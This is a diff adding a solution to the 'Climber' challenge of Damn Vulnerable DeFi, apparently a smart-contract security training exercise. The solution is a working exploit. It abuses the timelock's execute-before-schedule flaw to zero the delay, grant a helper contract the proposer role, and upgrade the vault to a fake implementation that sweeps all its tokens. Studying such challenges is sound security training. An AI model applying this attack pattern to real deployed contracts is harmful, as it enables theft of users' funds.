@@ -7,6 +7,10 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +89,37 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Temp temp = new Temp();
+        FakeImplementation fakeImplementation = new FakeImplementation();
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        // update max delay
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, 0);
+
+        // grant temp as proposer
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(temp)));
+
+        // change implementation & call sweep funds
+        targets[2] = address(vault);
+        dataElements[2] = abi.encodeWithSelector(
+            UUPSUpgradeable.upgradeToAndCall.selector,
+            fakeImplementation,
+            abi.encodeCall(FakeImplementation.sweep, (address(token), recovery))
+        );
+
+        // schedule
+        targets[3] = address(temp);
+        dataElements[3] = abi.encodeCall(
+            Temp.callSchedule,
+            (address(timelock), address(fakeImplementation), address(temp), address(vault), address(token), recovery)
+        );
+
+        timelock.execute(targets, values, dataElements, 0);
     }
 
     /**
@@ -94,5 +128,48 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Temp {
+    function callSchedule(
+        address timelock,
+        address newImplementation,
+        address temp,
+        address vault,
+        address token,
+        address recovery
+    ) external {
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        // update max delay
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, 0);
+
+        // grant temp as proposer
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(temp)));
+
+        // change implementation & call sweep funds
+        targets[2] = address(vault);
+        dataElements[2] = abi.encodeWithSelector(
+            UUPSUpgradeable.upgradeToAndCall.selector,
+            newImplementation,
+            abi.encodeCall(FakeImplementation.sweep, (address(token), recovery))
+        );
+
+        // schedule
+        targets[3] = temp;
+        dataElements[3] = abi.encodeCall(Temp.callSchedule, (timelock, newImplementation, temp, vault, token, recovery));
+
+        ClimberTimelock(payable(timelock)).schedule(targets, values, dataElements, 0);
+    }
+}
+
+contract FakeImplementation is ClimberVault {
+    function sweep(address token, address to) external {
+        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
     }
 }
